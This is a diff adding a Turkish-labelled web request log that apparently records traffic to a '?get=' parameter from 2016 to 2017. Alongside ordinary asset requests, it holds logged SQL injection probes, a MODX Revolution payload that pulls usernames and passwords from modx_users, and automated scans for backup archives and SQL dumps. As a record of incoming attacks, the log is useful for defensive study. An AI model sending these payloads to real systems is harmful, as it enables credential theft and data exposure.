@@ -1,0 +1,204 @@
+Tarih: Sun 13 Nov 2016 13:40
+ Sorgulanan Baglanti: ?get=index.php&get=assets/css/bootstrap.min.css
+ IP: ::1
+___________________________________________
+Tarih: Sun 13 Nov 2016 13:40
+ Sorgulanan Baglanti: ?get=index.php&get=assets/css/bootstrap.min.css
+ IP: ::1
+___________________________________________
+Tarih: Sun 13 Nov 2016 13:40
+ Sorgulanan Baglanti: ?get=index.php&get=assets/css/bootstrap.min.css
+ IP: ::1
+___________________________________________
+Tarih: Sun 13 Nov 2016 13:40
+ Sorgulanan Baglanti: ?get=index.php&get=assets/css/bootstrap.min.css
+ IP: ::1
+___________________________________________
+Tarih: Sun 13 Nov 2016 13:41
+ Sorgulanan Baglanti: ?get=index.php&get=assets/css/bootstrap.min.css
+ IP: ::1
+___________________________________________
+Tarih: Sun 13 Nov 2016 13:41
+ Sorgulanan Baglanti: ?get=index.php&get=assets/css/bootstrap.min.css
+ IP: ::1
+___________________________________________
+Tarih: Sun 13 Nov 2016 13:41
+ Sorgulanan Baglanti: ?get=index.php&get=assets/css/bootstrap.min.css
+ IP: ::1
+___________________________________________
+Tarih: Sun 13 Nov 2016 13:41
+ Sorgulanan Baglanti: ?get=index.php&get=assets/css/bootstrap.min.css
+ IP: ::1
+___________________________________________
+Tarih: Sun 13 Nov 2016 13:41
+ Sorgulanan Baglanti: ?get=index.php&get=assets/js/bootstrap.min.js
+ IP: ::1
+___________________________________________
+Tarih: Sun 13 Nov 2016 13:41
+ Sorgulanan Baglanti: ?get=index.php&get=assets/js/bootbox.min.js
+ IP: ::1
+___________________________________________
+Tarih: Thu 17 Nov 2016 12:33
+ Sorgulanan Baglanti: ?s=999999.9+union+all+select+0x31303235343830303536--
+ IP: ::1
+___________________________________________
+Tarih: Thu 17 Nov 2016 12:33
+ Sorgulanan Baglanti: ?s=999999.9+union+all+select+0x31303235343830303536--
+ IP: ::1
+___________________________________________
+Tarih: Thu 17 Nov 2016 12:33
+ Sorgulanan Baglanti: ?s=999999.9+union+all+select+0x31303235343830303536--
+ IP: ::1
+___________________________________________
+Tarih: Thu 17 Nov 2016 12:33
+ Sorgulanan Baglanti: ??s=999999.9+union+all+select+0x31303235343830303536%2c0x31303235343830303536%2c0x31303235343830303536--
+ IP: ::1
+___________________________________________
+Tarih: Fri 05 May 2017 20:12
+ Sorgulanan Baglanti: ?get=connectors/resource/index.php&ctx[rank%60+in+(666)+union+select+id,username,password+from+modx_users+where+id+in(1);/*]=fuckyoumodxrevolutionagain2
+ IP: 37.221.246.12
+___________________________________________
+Tarih: Tue 09 May 2017 1:39
+ Sorgulanan Baglanti: ?get=connectors/resource/index.php&ctx[rank%60+in+(666)+union+select+id,username,password+from+modx_users+where+id+in(1);/*]=fuckyoumodxrevolutionagain2
+ IP: 80.82.28.103
+___________________________________________
+Tarih: Tue 16 May 2017 9:56
+ Sorgulanan Baglanti: ?get=connectors/resource/index.php&ctx[rank%60+in+(666)+union+select+id,username,password+from+modx_users+where+id+in(1);/*]=fuckyoumodxrevolutionagain2
+ IP: 80.82.28.103
+___________________________________________
+Tarih: Mon 29 May 2017 17:58
+ Sorgulanan Baglanti: ?get=connectors/resource/index.php&ctx[rank%60+in+(666)+union+select+id,username,password+from+modx_users+where+id+in(1);/*]=fuckyoumodxrevolutionagain2
+ IP: 82.217.114.19
+___________________________________________
+Tarih: Sat 15 Jul 2017 4:05
+ Sorgulanan Baglanti: ?get=httpdocs.rar
+ IP: 77.247.181.165
+___________________________________________
+Tarih: Sat 15 Jul 2017 4:05
+ Sorgulanan Baglanti: ?get=https.rar
+ IP: 77.247.181.165
+___________________________________________
+Tarih: Sat 15 Jul 2017 4:05
+ Sorgulanan Baglanti: ?get=httpdocs.tar.gz
+ IP: 77.247.181.165
+___________________________________________
+Tarih: Sat 15 Jul 2017 4:05
+ Sorgulanan Baglanti: ?get=https.7z
+ IP: 77.247.181.165
+___________________________________________
+Tarih: Sat 15 Jul 2017 4:05
+ Sorgulanan Baglanti: ?get=http.tar.gz
+ IP: 77.247.181.165
+___________________________________________
+Tarih: Sat 15 Jul 2017 4:05
+ Sorgulanan Baglanti: ?get=http.bak
+ IP: 77.247.181.165
+___________________________________________
+Tarih: Sat 15 Jul 2017 4:05
+ Sorgulanan Baglanti: ?get=https.bak
+ IP: 77.247.181.165
+___________________________________________
+Tarih: Sat 15 Jul 2017 4:05
+ Sorgulanan Baglanti: ?get=httpdocs.bak
+ IP: 77.247.181.165
+___________________________________________
+Tarih: Sat 15 Jul 2017 4:05
+ Sorgulanan Baglanti: ?get=http.zip
+ IP: 77.247.181.165
+___________________________________________
+Tarih: Sat 15 Jul 2017 4:05
+ Sorgulanan Baglanti: ?get=https.sql
+ IP: 77.247.181.165
+___________________________________________
+Tarih: Sat 15 Jul 2017 4:05
+ Sorgulanan Baglanti: ?get=httpdocs.sql
+ IP: 77.247.181.165
+___________________________________________
+Tarih: Sat 15 Jul 2017 4:05
+ Sorgulanan Baglanti: ?get=https.zip
+ IP: 77.247.181.165
+___________________________________________
+Tarih: Sat 15 Jul 2017 4:05
+ Sorgulanan Baglanti: ?get=http.7z
+ IP: 77.247.181.165
+___________________________________________
+Tarih: Sat 15 Jul 2017 4:05
+ Sorgulanan Baglanti: ?get=httpdocs.7z
+ IP: 77.247.181.165
+___________________________________________
+Tarih: Sat 15 Jul 2017 4:05
+ Sorgulanan Baglanti: ?get=https.tar.gz
+ IP: 77.247.181.165
+___________________________________________
+Tarih: Sat 15 Jul 2017 4:05
+ Sorgulanan Baglanti: ?get=http.rar
+ IP: 77.247.181.165
+___________________________________________
+Tarih: Sat 15 Jul 2017 4:05
+ Sorgulanan Baglanti: ?get=http.sql
+ IP: 77.247.181.165
+___________________________________________
+Tarih: Sat 15 Jul 2017 4:05
+ Sorgulanan Baglanti: ?get=httpdocs.zip
+ IP: 77.247.181.165
+___________________________________________
+Tarih: Sat 15 Jul 2017 4:05
+ Sorgulanan Baglanti: ?get=https.zip
+ IP: 77.247.181.165
+___________________________________________
+Tarih: Sat 15 Jul 2017 4:05
+ Sorgulanan Baglanti: ?get=https.bak
+ IP: 77.247.181.165
+___________________________________________
+Tarih: Sat 15 Jul 2017 4:05
+ Sorgulanan Baglanti: ?get=https.tar.gz
+ IP: 77.247.181.165
+___________________________________________
+Tarih: Sat 15 Jul 2017 4:05
+ Sorgulanan Baglanti: ?get=httpdocs.rar
+ IP: 77.247.181.165
+___________________________________________
+Tarih: Sat 15 Jul 2017 4:05
+ Sorgulanan Baglanti: ?get=httpdocs.bak
+ IP: 77.247.181.165
+___________________________________________
+Tarih: Sat 15 Jul 2017 4:05
+ Sorgulanan Baglanti: ?get=http.tar.gz
+ IP: 77.247.181.165
+___________________________________________
+Tarih: Sat 15 Jul 2017 4:05
+ Sorgulanan Baglanti: ?get=httpdocs.zip
+ IP: 77.247.181.165
+___________________________________________
+Tarih: Sat 15 Jul 2017 4:05
+ Sorgulanan Baglanti: ?get=httpdocs.sql
+ IP: 77.247.181.165
+___________________________________________
+Tarih: Sat 15 Jul 2017 4:05
+ Sorgulanan Baglanti: ?get=http.zip
+ IP: 77.247.181.165
+___________________________________________
+Tarih: Sat 15 Jul 2017 4:05
+ Sorgulanan Baglanti: ?get=https.rar
+ IP: 77.247.181.165
+___________________________________________
+Tarih: Sat 15 Jul 2017 4:05
+ Sorgulanan Baglanti: ?get=httpdocs.7z
+ IP: 77.247.181.165
+___________________________________________
+Tarih: Sat 15 Jul 2017 4:05
+ Sorgulanan Baglanti: ?get=http.rar
+ IP: 77.247.181.165
+___________________________________________
+Tarih: Sat 15 Jul 2017 4:05
+ Sorgulanan Baglanti: ?get=https.sql
+ IP: 77.247.181.165
+___________________________________________
+Tarih: Sat 15 Jul 2017 4:05
+ Sorgulanan Baglanti: ?get=http.7z
+ IP: 77.247.181.165
+___________________________________________
+Tarih: Sat 15 Jul 2017 4:05
+ Sorgulanan Baglanti: ?get=http.bak
+ IP: 77.247.181.165
+___________________________________________
